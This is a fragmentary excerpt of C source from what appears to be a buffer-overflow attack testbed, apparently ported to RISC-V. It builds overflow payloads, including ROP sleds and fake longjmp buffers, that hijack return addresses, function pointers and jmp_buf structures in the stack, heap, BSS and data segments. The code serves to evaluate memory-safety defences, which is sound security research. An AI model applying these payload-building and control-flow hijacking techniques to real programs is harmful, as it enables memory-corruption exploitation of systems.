...
static unsigned long fake_esp_jmpbuff[15] = {
    0xDEADBEEFDEADBEEF,
    0xDEADBEEFDEADBEEF,
    0xDEADBEEFDEADBEEF,
    0xDEADBEEFDEADBEEF,
    ...
    0xDEADBEEFDEADBEEF,
    (unsigned long)&exit,
    (unsigned long)&cf_ret_param, 448}; //448 => 0700 mode
...
static jmp_buf data_jmp_buffer;

int fooz(const char *a, int b);
...
static unsigned long rop_sled[7] = {
    (unsigned long)&gadget1 + 62,
    0xFFFFFFFF,
    (unsigned long)&gadget2 + 62,
    (unsigned long)&cf_ret_param,
    0xFFFFFFFF,
    (unsigned long)&gadget3 + 62,
    (unsigned long)&exit};
...
int creat(const char *path, mode_t mode){
    fprintf(stderr, "creat was called\n");
    exit(0);
}
...
int main(int argc, char **argv) {
  ...
  for(i=0; i < 512; i++){
	if(!contains_terminating_char((unsigned long)stack_jmp_buffer_param_array[i]))
		break;
  }
  if (i == 512){
  ...
  if(output_debug_info) {
    printf("getenv(\"param_to_system\") = 0x%016lx\n", getenv("param_to_system"));
...
#define OLD_BP_PTR ((void*)FRAME_PTR - 2 * sizeof(void*))
...
void perform_attack(FILE *output_stream,
 ...
 // char stack_buffer2[1];
  ...
  /* pointer array.                                                         */
  int (**heap_func_ptr)(const char *, int) = 0;
  ...
  case STACK:
    ...
    heap_jmp_buffer = (void *)heap_buffer2;
    break;
  case HEAP:
    ...
    if(((unsigned long)heap_buffer1 < (unsigned long)heap_buffer2) &&
      ...
      heap_jmp_buffer = (jmp_buf *)malloc(sizeof(jmp_buf)); //NN Now it does...hopefully in the correct order
    } else {
      if(output_error_msg) {
  ...
  case DIRECT:
    ...
    case LONGJMP_BUF_STACK_VAR:
      target_addr = &stack_jmp_buffer[0];
      break;
    case LONGJMP_BUF_STACK_PARAM:
      target_addr = &stack_jmp_buffer_param[0];
      break;
    case LONGJMP_BUF_HEAP:
      printf("heap_jmp_buffer @%p\n",heap_jmp_buffer);
      target_addr = (void *)heap_jmp_buffer; //NN now it should point to the correct entry of the
					//jmp_buf structure
      break;
    case LONGJMP_BUF_BSS:
      target_addr = &bss_jmp_buffer[0];
      break;
    case LONGJMP_BUF_DATA:
      target_addr = &data_jmp_buffer[0];
      break;
  ...
  case INDIRECT:
	...
	payload.fake_return_addr = (long *)&creat; //NN42
      } else {
	...
	//NN ofcourse we are not sure if the else is correct...we will see
      ...
      break;
    case LONGJMP_BUF_STACK_VAR:
      payload.overflow_ptr = &stack_jmp_buffer[0];
      break;
    case LONGJMP_BUF_STACK_PARAM:
      payload.overflow_ptr = &stack_jmp_buffer_param[0];
      break;
    case LONGJMP_BUF_HEAP:
      payload.overflow_ptr = (void *)heap_jmp_buffer; // NN
      break;
    case LONGJMP_BUF_BSS:
      payload.overflow_ptr = &bss_jmp_buffer_indirect[0]; //NN
      break;
    case LONGJMP_BUF_DATA:
      payload.overflow_ptr = &data_jmp_buffer[0];
      break;
    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of code pointer\n");
  ...
  if ((unsigned long)target_addr > (unsigned long)buffer) {
    payload.size =
     ...
     fprintf(stderr, "target_addr == 0x%016lx\n", (unsigned long)target_addr);
     fprintf(stderr, "buffer == 0x%016lx\n", (unsigned long)buffer);
     fprintf(stderr, "psize == %ld\n",payload.size);
     fprintf(stderr, "stack_buffer == 0x%016lx\n", (unsigned long)stack_buffer);
  ...
  if(output_debug_info) {
    ...
    fprintf(output_stream, "Address to payload->buffer: %p\n", &(payload.buffer));
    fprintf(output_stream, "Value of payload->buffer: %p\n", (payload.buffer));
    fprintf(output_stream, "Address to overflow buffer: %p\n", buffer);
    fprintf(output_stream, "Value of overflow buffer: %lx\n", *buffer);
    fprintf(output_stream, "payload.overflow_ptr: %p\n", payload.overflow_ptr);
    // Output payload info
  ...
  case STRNCAT:
    ...
    break;
  case SSCANF:
    snprintf(format_string_buf, 15, "%%%lic", payload.size);
  ...
  case INDIRECT:
	...
	*(long *)(*(long *)target_addr) =
	...
	printf("*(long *)(*(long *)target_addr) = %lx\n",
	       	*(long *)(*(long *)target_addr));
	printf("*(long *)(*(long *)(*(long *)target_addr)) = %lx\n",
	       	*(long *)(*(long *)(*(long *)target_addr)));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 4) = %lx\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 4));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 8) = %lx\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 8));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 12) = %lx\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 12));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 16) = %lx\n",
	...
	/* Note: These attack forms are considered impossible           */
	*(long *)(*(long *)target_addr) = (long)&creat;
      }
      break;
    default:
      if(output_error_msg) {
  ...
  if(!output_debug_info) {
    ...
    case FUNC_PTR_DATA:
	//NN
	if (contains_terminating_char((unsigned long)&data_func_ptr1))
...
boolean build_payload(CHARPAYLOAD *payload) {
  ...
  //NN
  fprintf(stderr,"\noverflow_ptr: 0x%016lx\n", (unsigned long)payload->overflow_ptr);
...
#if 0 // this is not necessary for riscv, ra is the first element
...
#if 0 // parameter not passed through stack
  ...
  if(attack.code_ptr == OLD_BASE_PTR) {
...
#if 0 // argument are passed through registers
    // Extend payload size
    ...
    temp_char_buffer = (char *)malloc(payload->size);
    // Copy current payload to new payload buffer
    memcpy(temp_char_buffer, payload->buffer, old_size);
    // Copy existing return address to new payload
    memcpy(temp_char_buffer + old_size - 1,
	   (payload->ptr_to_correct_return_addr),
	   sizeof(long));
    // Free the old payload buffer
    free(payload->buffer);
    ...
    memcpy(payload->buffer + payload->size -
			     1 -               // NULL terminator
			     sizeof(long) -    // the injected permission
  ...
  if(!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
    remove_nulls(payload->buffer, payload->size); //FIXME 64bit pointers
  }

  /* Finally, add the terminating null character at the end */
  payload->buffer[payload->size - 1] = '\0';
  //print_memory(stderr, payload->buffer, payload->size);
...
#if 0 // 64-bit pointers always contains '\0'
...
void print_payload_info(FILE *stream, CHARPAYLOAD *payload) {
  ...
  fprintf(stream, "Buffer size set: %li\n\n", payload->size);
...
void print_memory(FILE *stream, char *start, size_t words) {
  for(pointer = start; pointer < (char *)(start + words); pointer += 4) {
    fprintf(stream, "%p: 0x%08x\n", pointer - start, *(unsigned int*)pointer);
  }
}
